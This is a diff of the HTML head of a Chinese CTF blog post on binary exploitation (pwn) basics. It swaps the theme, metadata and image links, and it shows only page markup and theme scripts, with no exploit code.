@@ -1,402 +1,169 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="pwn的核心：二进制漏洞的利用和挖掘研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件linux系统下ELF&#x3D;windows系统下EXE文件一次简单的hack  CTF中pwn攻击脚本思路： 1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口3">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn探索--大杂烩 | 幻境</title><meta name="author" content="yub"><meta name="copyright" content="yub"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="pwn的核心：二进制漏洞的利用和挖掘研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件linux系统下ELF&#x3D;windows系统下EXE文件一次简单的hack  CTF中pwn攻击脚本思路： 1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口3">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn探索--大杂烩">
 <meta property="og:url" content="https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="幻境">
 <meta property="og:description" content="pwn的核心：二进制漏洞的利用和挖掘研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件linux系统下ELF&#x3D;windows系统下EXE文件一次简单的hack  CTF中pwn攻击脚本思路： 1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口3">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206225702913.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206230237084.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206231832031.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206232441503.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206235815274.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208112405419.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208141609541.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208142032344.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208151435139.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208152953051.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161344724.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161302543.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162239886.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162610999.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164349628.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164650781.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170556987.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170832516.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208172413117.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208173923251.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208173818672.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209094759828.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209100855874.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209101728223.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102340553.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102615915.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209103333679.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209104000217.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209105139584.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209110221569.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209110919361.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209112610898.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230216235806404.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219153353227.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219154052743.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230219154202756.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219161736349.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219165330509.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002608337.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002832185.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160248520.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160924626.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221162513214.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165139013.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165745894.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171244473.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171442165.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221234220854.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222002023021.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222191527599.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075312799.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075541707.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112513513.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230411152517155.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412200146471.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223115046186.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224081246465.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112708517.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223113034773.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224125905589.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226153916098.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226154515139.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226155524945.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230226155734820.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226162609326.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230306232744633.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307000253788.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230310080407959.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230325231231643.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153211276.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153739815.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409163357731.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230410194103144.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410201002577.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412210903759.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412204604894.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214823229.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214936627.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412215132315.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230413185604877.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414210446532.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414212714060.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214750326.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214800705.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415101652128.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415112529947.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415114324006.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418130159741.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418132149276.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418132737386.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418133451380.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418205450196.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418212246848.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418213125953.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419201116801.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419203107813.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419215529699.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423182143460.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230423193313158.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194347199.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194601499.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194754995.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424192129082.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424194313669.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195822728.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195913266.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424200850159.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205359479.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424204704035.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205428601.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424210938062.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125354842.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125119149.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425153257042.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230426210301792.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202338093.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202101873.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230428193230160.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230511094407053.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520224921532.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520225916659.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523002237695.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101555442.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101634224.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104215828.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104710354.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523105629335.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523114523470.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230523122130079.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610163822498.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182043459.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182053082.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225648504.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225717582.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615232327380.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616002416632.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yub/First@main/image-20230616134523270.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616134746197.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616162630147.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616170955472.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616174226840.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616175743170.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233511677.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617134142917.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617140647896.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234752208.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617143930107.png">
-<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230617145200469.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617152524631.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617215936729.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233738837.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235205771.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617235515996.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617220021172.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222745908.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222844117.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617223313606.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617225749420.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617230144174.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617231321789.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233352292.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617233454554.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105030445.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105235986.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618105723997.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617234705813.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111056657.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618111551403.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618230718261.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235211411.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235427918.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235448673.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618234942479.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618235237538.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619151359619.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619120041795.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160128310.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160356676.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619160410293.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619161430277.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193114872.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193556660.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203856606.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193754379.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619194533056.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619195914454.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619202854520.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203751739.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205339973.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619205857320.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155645246.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620161845271.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620162028689.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155732238.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155800172.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620155817628.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620174531638.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620201633271.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620231326851.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221606653.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221355683.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620220117301.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222639346.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222239841.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222903872.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620223247527.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620224148329.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230216527.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230551936.png">
+<meta property="og:image" content="https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg">
 <meta property="article:published_time" content="2023-08-31T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-09-01T13:37:37.334Z">
+<meta property="article:modified_time" content="2024-11-01T15:36:43.124Z">
 <meta property="article:author" content="yub">
 <meta property="article:tag" content="pwn,知识碎片">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>pwn探索--大杂烩</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+<meta name="twitter:image" content="https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pwn探索--大杂烩',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-01 23:36:43'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    <!-- Umami Analytics -->
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
